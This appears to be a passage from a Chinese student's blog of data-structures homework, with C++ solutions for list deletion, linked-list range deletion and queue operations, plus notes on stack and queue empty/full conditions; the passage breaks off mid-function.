<h2 id="伪代码"><a href="#伪代码" class="headerlink" title="伪代码"></a>伪代码</h2><h3 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：顺序表data，元素x</span><br><span class="line">输出：删除所有值为x的元素后的顺序表</span><br><span class="line"></span><br><span class="line">1. 初始化一个新的索引j为0</span><br><span class="line">2. 对于顺序表data中的每个元素，执行以下操作：</span><br><span class="line">   1. 如果当前元素不等于x，则将当前元素复制到j位置，并将j增加1</span><br><span class="line">3. 将顺序表data的长度设置为j</span><br></pre></td></tr></table></figure></div>

<h3 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：顺序表data，元素x</span><br><span class="line">输出：删除所有值为x的元素后的顺序表</span><br><span class="line"></span><br><span class="line">1. 对于顺序表data中的每个元素，执行以下操作：</span><br><span class="line">   1. 如果当前元素等于x，则执行以下操作：</span><br><span class="line">      1. 对于从当前元素到倒数第二个元素的每个元素，将下一个元素复制到当前位置</span><br><span class="line">      2. 将顺序表data的长度减1</span><br><span class="line">      3. 将当前索引减1（因为删除了元素）</span><br></pre></td></tr></table></figure></div>

<h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;random&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;chrono&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MaxSize = <span class="number">100</span>;            <span class="comment">//100只是示例性的数据，根据实际问题具体定义</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">DataType</span>&gt;          <span class="comment">//定义模板类SeqList</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SeqList</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">SeqList</span>();                     <span class="comment">//无参构造函数，建立空的顺序表</span></span><br><span class="line">    <span class="built_in">SeqList</span>(DataType a[], <span class="type">int</span> n);      <span class="comment">//有参构造函数，建立长度为n的顺序表</span></span><br><span class="line">    ~<span class="built_in">SeqList</span>();                    <span class="comment">//析构函数</span></span><br><span class="line">    <span class="function">DataType <span class="title">Delete</span><span class="params">(<span class="type">int</span> i)</span></span>;            <span class="comment">//删除操作，删除第i个元素</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">PrintList</span><span class="params">()</span></span>;                 <span class="comment">//遍历操作，按序号依次输出各元素</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    DataType data[MaxSize];          <span class="comment">//存放数据元素的数组</span></span><br><span class="line">    <span class="type">int</span> length;                       <span class="comment">//线性表的长度</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">DataType</span>&gt;</span><br><span class="line">DataType SeqList&lt;DataType&gt; ::<span class="built_in">Delete</span>(<span class="type">int</span> x)</span><br><span class="line">&#123;   <span class="comment">/*这段代码遍历顺序表，每次遇到值不等于x的元素时，就将其复制到新的位置。最后，它将顺序表的长度设置为新的长度。这个算法的空间复杂度是O(1)，因为它只使用了固定数量的额外空间。*/</span></span><br><span class="line">    <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; length; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (data[i] != x)</span><br><span class="line">        &#123;</span><br><span class="line">            data[j] = data[i];</span><br><span class="line">            j++;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    length = j;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    这个有两种做法，还有一种是直接删除。每次遇到值为x的元素时，就将其删除。但是，这种方法的时间复杂度是O(n^2)，因为每次删除操作都需要O(n)的时间。</span></span><br><span class="line"><span class="comment">    for (int i = 0; i &lt; length; i++)</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">        if (data[i] == x)</span></span><br><span class="line"><span class="comment">        &#123;</span></span><br><span class="line"><span class="comment">            for (int j = i; j &lt; length - 1; j++)</span></span><br><span class="line"><span class="comment">            &#123;</span></span><br><span class="line"><span class="comment">                data[j] = data[j + 1];</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">            length--;</span></span><br><span class="line"><span class="comment">            i--;  // 因为删除了元素，所以需要将索引减1</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125;*/</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">DataType</span>&gt;</span><br><span class="line">SeqList&lt;DataType&gt; :: ~<span class="built_in">SeqList</span>()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">DataType</span>&gt;</span><br><span class="line">SeqList&lt;DataType&gt; ::<span class="built_in">SeqList</span>()</span><br><span class="line">&#123;</span><br><span class="line">    length = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">DataType</span>&gt;</span><br><span class="line">SeqList&lt;DataType&gt; ::<span class="built_in">SeqList</span>(DataType a[], <span class="type">int</span> n)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; MaxSize)</span><br><span class="line">        <span class="keyword">throw</span> <span class="string">&quot;参数非法&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        data[i] = a[i];</span><br><span class="line">    length = n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">DataType</span>&gt;</span><br><span class="line"><span class="type">void</span> SeqList&lt;DataType&gt; ::<span class="built_in">PrintList</span>()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; length; i++)</span><br><span class="line">        cout &lt;&lt; data[i]&lt;&lt;<span class="string">&quot; &quot;</span>;                   <span class="comment">//依次输出线性表的元素值</span></span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">                   _ooOoo_</span></span><br><span class="line"><span class="comment">                  o8888888o</span></span><br><span class="line"><span class="comment">                  88&quot; . &quot;88</span></span><br><span class="line"><span class="comment">                  (| -_- |)</span></span><br><span class="line"><span class="comment">                  O\  =  /O</span></span><br><span class="line"><span class="comment">               ____/`---&#x27;\____</span></span><br><span class="line"><span class="comment">            .&#x27;  \\|     |//  `.</span></span><br><span class="line"><span class="comment">            /  \\|||  :  |||//  \</span></span><br><span class="line"><span class="comment">           /  _||||| -:- |||||-  \</span></span><br><span class="line"><span class="comment">           |   | \\\  -  /// |   |</span></span><br><span class="line"><span class="comment">           | \_|  &#x27;&#x27;\---/&#x27;&#x27;  |   |</span></span><br><span class="line"><span class="comment">           \  .-\__  `-`  ___/-. /</span></span><br><span class="line"><span class="comment">         ___`. .&#x27;  /--.--\  `. . __</span></span><br><span class="line"><span class="comment">      .&quot;&quot; &#x27;&lt;  `.___\_&lt;|&gt;_/___.&#x27;  &gt;&#x27;&quot;&quot;.</span></span><br><span class="line"><span class="comment">     | | :  `- \`.;`\ _ /`;.`/ - ` : | |</span></span><br><span class="line"><span class="comment">     \  \ `-.   \_ __\ /__ _/   .-` /  /</span></span><br><span class="line"><span class="comment">======`-.____`-.___\_____/___.-`____.-&#x27;======</span></span><br><span class="line"><span class="comment">                   `=---=&#x27;</span></span><br><span class="line"><span class="comment">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span></span><br><span class="line"><span class="comment">    佛祖保佑       永不宕机     永无BUG</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 使用当前时间作为随机数生成器的种子</span></span><br><span class="line">    <span class="type">unsigned</span> seed = chrono::system_clock::<span class="built_in">now</span>().<span class="built_in">time_since_epoch</span>().<span class="built_in">count</span>();</span><br><span class="line">    <span class="comment">// 创建一个随机数生成器</span></span><br><span class="line">    <span class="function">default_random_engine <span class="title">generator</span><span class="params">(seed)</span></span>;</span><br><span class="line">    <span class="comment">// 创建一个均匀分布的随机数生成器，范围从1到100</span></span><br><span class="line">    <span class="function">uniform_int_distribution&lt;<span class="type">int</span>&gt; <span class="title">distribution</span><span class="params">(<span class="number">1</span>, <span class="number">10</span>)</span></span>;</span><br><span class="line">    <span class="type">int</span> maxsize;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;请输入你要创建表的大小&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cin &gt;&gt; maxsize;</span><br><span class="line">    <span class="type">int</span>* a = <span class="keyword">new</span> <span class="type">int</span>[maxsize];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; maxsize; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        a[i] = <span class="built_in">distribution</span>(generator);<span class="comment">//赋值</span></span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;已创建一个最大长度&quot;</span> &lt;&lt; maxsize &lt;&lt; <span class="string">&quot;的顺序表&quot;</span> &lt;&lt; endl;</span><br><span class="line">    SeqList&lt;<span class="type">int</span>&gt; L&#123; a, maxsize &#125;;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;*******执行遍历链表******&quot;</span> &lt;&lt; endl;</span><br><span class="line">    L.<span class="built_in">PrintList</span>();</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;**************************&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;请输入你要删除的数据&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="type">int</span> del;</span><br><span class="line">    cin &gt;&gt; del;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;删除的数据是&quot;</span> &lt;&lt; L.<span class="built_in">Delete</span>(del) &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;*******执行遍历链表******&quot;</span> &lt;&lt; endl;</span><br><span class="line">    L.<span class="built_in">PrintList</span>();</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;**************************&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="作业Ch2-5-算法设计：已知单链表中各结点的元素值为整型且递增有序，设计算法删除链表中大于mink且小于maxk的所有元素，并释放被删结点的存储空间，给出算法伪代码和源代码。"><a href="#作业Ch2-5-算法设计：已知单链表中各结点的元素值为整型且递增有序，设计算法删除链表中大于mink且小于maxk的所有元素，并释放被删结点的存储空间，给出算法伪代码和源代码。" class="headerlink" title="作业Ch2-5:算法设计：已知单链表中各结点的元素值为整型且递增有序，设计算法删除链表中大于mink且小于maxk的所有元素，并释放被删结点的存储空间，给出算法伪代码和源代码。"></a>作业Ch2-5:算法设计：已知单链表中各结点的元素值为整型且递增有序，设计算法删除链表中大于mink且小于maxk的所有元素，并释放被删结点的存储空间，给出算法伪代码和源代码。</h1><blockquote>
<p>这个也是借助ai加自己写的，就加了一个条件判断，另外还需要加强一下头插法尾插法的算法，不熟练</p>
</blockquote>
<h2 id="伪代码-1"><a href="#伪代码-1" class="headerlink" title="伪代码"></a>伪代码</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 定义一个模板函数Delete，接受两个参数mink和maxk。</span><br><span class="line">2. 初始化两个指针p和q，其中p指向链表的第一个节点，q指向头节点。</span><br><span class="line">3. 进入一个while循环，条件是p不为空。</span><br><span class="line">   - 如果p指向的节点的数据在mink和maxk之间，则删除该节点，并将q的next指针指向p的next节点。然后更新p为q的next节点。</span><br><span class="line">   - 如果p指向的节点的数据不在mink和maxk之间，则将q更新为p，然后将p更新为p的next节点。</span><br><span class="line">4. 循环结束后，所有在mink和maxk之间的节点都被删除。</span><br></pre></td></tr></table></figure></div>

<h2 id="源代码-1"><a href="#源代码-1" class="headerlink" title="源代码"></a>源代码</h2><div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span>                  <span class="comment">//引入输入输出流</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;random&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;chrono&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span></span><br><span class="line">&#123;</span><br><span class="line">    DataType data;               <span class="comment">//数据域</span></span><br><span class="line">    Node&lt;DataType&gt;* next;       <span class="comment">//指针域</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LinkList</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">LinkList</span>();                      <span class="comment">//无参构造函数，建立只有头结点的空链表</span></span><br><span class="line">    <span class="built_in">LinkList</span>(DataType a[], <span class="type">int</span> n);       <span class="comment">//有参构造函数，建立有n个元素的单链表</span></span><br><span class="line">    ~<span class="built_in">LinkList</span>();                     <span class="comment">//析构函数</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">Delete</span><span class="params">(<span class="type">int</span> mink, <span class="type">int</span> maxk)</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">PrintList</span><span class="params">()</span></span>;                  <span class="comment">//遍历操作，按序号依次输出各元素</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    Node&lt;DataType&gt;* first;           <span class="comment">//单链表的头指针</span></span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line"><span class="type">void</span> LinkList&lt;DataType&gt; ::<span class="built_in">Delete</span>(<span class="type">int</span> mink,<span class="type">int</span> maxk)</span><br><span class="line">&#123;</span><br><span class="line">    DataType x;</span><br><span class="line">    Node&lt;DataType&gt;* p = first-&gt;next, * q = first;        <span class="comment">//工作指针p指向头结点</span></span><br><span class="line">    <span class="keyword">while</span> (p != <span class="literal">nullptr</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((p-&gt;data&lt;maxk) &amp;&amp;(p-&gt;data&gt;mink) )</span><br><span class="line">        &#123;</span><br><span class="line">            q-&gt;next = p-&gt;next;</span><br><span class="line">            <span class="keyword">delete</span> p;</span><br><span class="line">            p = q-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            q = p;</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line">LinkList&lt;DataType&gt; ::<span class="built_in">LinkList</span>()</span><br><span class="line">&#123;</span><br><span class="line">    first = <span class="keyword">new</span> Node&lt;DataType&gt;;              <span class="comment">//生成头结点</span></span><br><span class="line">    first-&gt;next = <span class="literal">nullptr</span>;                      <span class="comment">//头结点的指针域置空</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">DataType</span>&gt;</span><br><span class="line">LinkList&lt;DataType&gt; :: ~<span class="built_in">LinkList</span>()</span><br><span class="line">&#123;</span><br><span class="line">    Node&lt;DataType&gt;* q = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span> (first != <span class="literal">NULL</span>)        <span class="comment">//释放单链表的每一个结点的存储空间</span></span><br><span class="line">    &#123;</span><br><span class="line">        q = first;                 <span class="comment">//暂存被释放结点</span></span><br><span class="line">        first = first-&gt;next;         <span class="comment">// first指向被释放结点的下一个结点</span></span><br><span class="line">        <span class="keyword">delete</span> q;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line"><span class="type">void</span> LinkList&lt;DataType&gt; ::<span class="built_in">PrintList</span>()</span><br><span class="line">&#123;</span><br><span class="line">    Node&lt;DataType&gt;* p = first-&gt;next;                <span class="comment">//工作指针p初始化</span></span><br><span class="line">    <span class="keyword">while</span> (p != <span class="literal">nullptr</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; p-&gt;data &lt;&lt; <span class="string">&quot;\t&quot;</span>;</span><br><span class="line">        p = p-&gt;next;                 <span class="comment">//工作指针p后移，注意不能写作p++</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//尾插法构造</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line">LinkList&lt;DataType&gt; ::<span class="built_in">LinkList</span>(DataType a[], <span class="type">int</span> n)</span><br><span class="line">&#123;</span><br><span class="line">    first = <span class="keyword">new</span> Node&lt;DataType&gt;;                    <span class="comment">//生成头结点</span></span><br><span class="line">    Node&lt;DataType&gt;* r = first, * s = <span class="literal">nullptr</span>;           <span class="comment">//尾指针初始化</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        s = <span class="keyword">new</span> Node&lt;DataType&gt;; s-&gt;data = a[i];</span><br><span class="line">        r-&gt;next = s; r = s;                 <span class="comment">//将结点s插入到终端结点之后</span></span><br><span class="line">    &#125;</span><br><span class="line">    r-&gt;next = <span class="literal">nullptr</span>;        <span class="comment">//单链表建立完毕，将终端结点的指针域置空</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> maxsize;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;请输入你要创建表的大小&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cin &gt;&gt; maxsize;</span><br><span class="line">    <span class="type">int</span>* a = <span class="keyword">new</span> <span class="type">int</span>[maxsize];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; maxsize; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        a[i] = i;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;已创建一个最大长度&quot;</span> &lt;&lt; maxsize &lt;&lt; <span class="string">&quot;的单链表&quot;</span> &lt;&lt; endl;</span><br><span class="line">    LinkList&lt;<span class="type">int</span>&gt; L&#123; a, maxsize &#125;;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;*******执行遍历链表******&quot;</span> &lt;&lt; endl;</span><br><span class="line">    L.<span class="built_in">PrintList</span>();</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;**************************&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;请输入左右界定范围mink和maxk&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="type">int</span> mink, maxk;</span><br><span class="line">    cin &gt;&gt; mink &gt;&gt; maxk;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;**************************&quot;</span> &lt;&lt; endl;</span><br><span class="line">    L.<span class="built_in">Delete</span>(mink, maxk);</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;题解删除操作已执行完毕&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;*******执行遍历链表******&quot;</span> &lt;&lt; endl;</span><br><span class="line">    L.<span class="built_in">PrintList</span>();</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;**************************&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>学习笔记</category>
        <category>数据结构作业</category>
        <category>课后作业</category>
      </categories>
      <tags>
        <tag>数据结构作业</tag>
      </tags>
  </entry>
  <entry>
    <title>DS作业-4-Ch3-22网安物联网-20230927</title>
    <url>/posts/4311d78.html</url>
    <content><![CDATA[<blockquote>
<p>声明：仅供留档查阅，仅用作起到提示引导性作用，仅用作学习交流，切勿直接照搬</p>
</blockquote>
<h1 id="Ch3-1"><a href="#Ch3-1" class="headerlink" title="Ch3-1."></a>Ch3-1.</h1><p><strong>总结栈空、栈满、队空、队满的判定条件。</strong></p>
<p>栈和队列是两种常见的数据结构，它们的空和满的判断条件如下：</p>
<p><strong>栈</strong>：</p>
<ul>
<li><strong>栈空</strong>：当栈顶指针<code>top</code>等于-1时，表示栈为空。</li>
<li><strong>栈满</strong>：当栈顶指针<code>top</code>等于栈的最大容量减1（假设栈的最大容量为<code>maxSize</code>）时，表示栈已满，即<code>top == maxSize - 1</code>。</li>
</ul>
<p><strong>队列</strong>：</p>
<ul>
<li><strong>队空</strong>：当队头指针<code>front</code>等于队尾指针<code>rear</code>时，表示队列为空。</li>
<li><strong>队满</strong>：这个判断条件取决于你如何实现队列。如果你使用数组实现循环队列，那么当<code>(rear + 1) % maxSize == front</code>时，表示队列已满（假设队列的最大容量为<code>maxSize</code>）。这里的 <code>%</code> 是取余运算，用于实现循环。</li>
</ul>
<h1 id="Ch3-2"><a href="#Ch3-2" class="headerlink" title="Ch3-2."></a>Ch3-2.</h1><p> <strong>循环队列的优点是什么？设用数组来存放循环队列，你有几种判断队满和队空的方案？</strong></p>
<p><strong>循环队列</strong>的优点主要有以下几点：</p>
<ol>
<li><strong>有效利用空间</strong>：在普通队列中，当队尾指针到达数组的末端时，即使数组的前端还有空闲空间，也无法再添加新的元素。而循环队列通过将队列的首尾相连，形成一个循环，使得在队尾指针到达数组末端时，可以从数组前端继续添加新的元素，从而更有效地利用了空间。</li>
<li><strong>避免数据迁移</strong>：在普通队列中，每次出队操作后，为了维持队列的连续性，需要将所有元素向前移动一位，这会消耗大量的时间和计算资源。而在循环队列中，通过移动队头和队尾指针来实现入队和出队操作，无需移动元素本身，因此效率更高。</li>
</ol>
<p>对于使用数组实现的循环队列，常见的判断队满和队空的方案有以下几种：</p>
<ol>
<li><strong>牺牲一个存储空间</strong>：这是最常见的方法。当<code>(rear + 1) % maxSize == front</code>时，判断队列已满；当<code>rear == front</code>时，判断队列为空。这种方法的缺点是会浪费一个数组的存储空间。</li>
<li><strong>使用一个标志位</strong>：除了使用<code>front</code>和<code>rear</code>两个指针外，还可以额外使用一个标志位来判断队列的状态。当入队操作后<code>rear == front</code>时，将标志位设为满；当出队操作后<code>rear == front</code>时，将标志位设为空。这种方法可以充分利用所有存储空间，但需要额外的标志位。</li>
<li><strong>记录元素个数</strong>：除了使用<code>front</code>和<code>rear</code>两个指针外，还可以使用一个计数器来记录队列中元素的个数。当计数器为0时，判断队列为空；当计数器等于数组大小时，判断队列已满。这种方法同样可以充分利用所有存储空间，但需要额外的计数器。</li>
</ol>
<h1 id="Ch3-3"><a href="#Ch3-3" class="headerlink" title="Ch3-3."></a>Ch3-3.</h1><p>*<em>假设以带头结点的循环单链表表示队列，并且只设一个尾指针Node</em>Rear 指向队尾结点（没有队头指针Node <em>front），试编写入队和出队算法。</em>*</p>
<blockquote>
<p>自己写的，<del class="mask">目前还在报错，修改中……</del></p>
<p>已完工</p>
</blockquote>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span>                  <span class="comment">//引入输入输出流</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span></span><br><span class="line">&#123;</span><br><span class="line">    DataType data;               <span class="comment">//数据域</span></span><br><span class="line">    Node&lt;DataType&gt;* next;       <span class="comment">//指针域</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LinkList_Queue</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">LinkList_Queue</span>();                      <span class="comment">//无参构造函数，建立只有头结点的空链表</span></span><br><span class="line">    ~<span class="built_in">LinkList_Queue</span>();                     <span class="comment">//析构函数</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">Empety</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function">DataType <span class="title">Push</span><span class="params">(DataType x)</span></span>;       <span class="comment">//插入操作，第i个位置插入值为x的结点</span></span><br><span class="line">    <span class="function">DataType <span class="title">Pop</span><span class="params">()</span></span>;            </span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    Node&lt;DataType&gt;* first, * rear;           <span class="comment">//单链表的头指针</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line">LinkList_Queue&lt;DataType&gt; ::<span class="built_in">LinkList_Queue</span>()</span><br><span class="line">&#123;</span><br><span class="line">    Node&lt;DataType&gt;* s = <span class="literal">nullptr</span>;</span><br><span class="line">    s = <span class="keyword">new</span> Node&lt;DataType&gt;;    </span><br><span class="line">    s-&gt;next = <span class="literal">nullptr</span>;</span><br><span class="line">    first = rear = s;                      <span class="comment">//头结点的指针域置空</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">DataType</span>&gt;</span><br><span class="line">LinkList_Queue&lt;DataType&gt; :: ~<span class="built_in">LinkList_Queue</span>()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line"><span class="type">int</span> LinkList_Queue&lt;DataType&gt; ::<span class="built_in">Empety</span>()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (first == rear)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//入队算法</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line">DataType LinkList_Queue&lt;DataType&gt; ::<span class="built_in">Push</span>(DataType x)</span><br><span class="line">&#123;</span><br><span class="line">    Node&lt;DataType&gt;* s = <span class="literal">nullptr</span>;           </span><br><span class="line">    s = <span class="keyword">new</span> Node&lt;DataType&gt;; </span><br><span class="line">    s-&gt;data = x;</span><br><span class="line">    s-&gt;next = <span class="literal">nullptr</span>;</span><br><span class="line">    rear-&gt;next = s;</span><br><span class="line">    rear = s;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//出队算法</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line">DataType LinkList_Queue&lt;DataType&gt; ::<span class="built_in">Pop</span>()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (first == rear )</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;队空&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        DataType 